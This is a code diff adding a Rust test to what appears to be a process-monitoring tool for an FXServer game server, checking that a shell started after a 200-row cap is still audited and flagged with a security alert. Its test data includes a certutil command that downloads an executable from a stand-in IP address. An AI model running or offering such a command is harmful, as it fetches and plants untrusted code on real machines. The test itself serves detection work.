@@ -616,3 +616,37 @@ async fn a_program_s_row_runs_until_the_last_of_its_instances_ends() {
     lab.ended(1, 4120).await;
     assert_eq!(lab.processes().await[0].ended_at, Some(lab.clock.now()));
 }
+
+#[tokio::test]
+async fn a_shell_started_past_the_two_hundred_rows_of_a_run_is_audited_and_noted() {
+    let mut lab = lab().await;
+    lab.spawn(1).await;
+    let cmd = r"C:\Windows\System32\cmd.exe";
+    for index in 0..200 {
+        lab.start(
+            1,
+            5000 + index,
+            cmd,
+            &format!("cmd /c echo {index}"),
+            ProcessKind::Shell,
+        )
+        .await;
+    }
+
+    let payload = "cmd /c certutil -urlcache -f http://203.0.113.5/p.exe p.exe";
+    lab.start(1, 6000, cmd, payload, ProcessKind::Shell).await;
+    lab.start(1, 6001, cmd, "cmd /c echo bye", ProcessKind::Shell)
+        .await;
+    lab.exit(1, Some(0), None).await;
+
+    let rows = lab.db.read(|conn| store::processes(conn, 1000)).await.unwrap();
+    assert_eq!(rows.len(), 200);
+    let audited = lab.audited().await;
+    assert!(
+        audited.iter().any(|entry| entry["commandLine"] == payload),
+        "{audited:?}"
+    );
+    let note =
+        format!("security alert: FXServer's tree started cmd.exe (pid 6000, parent {FXSERVER} {MAIN})");
+    assert!(lab.notes().contains(&note), "{:?}", lab.notes());
+}
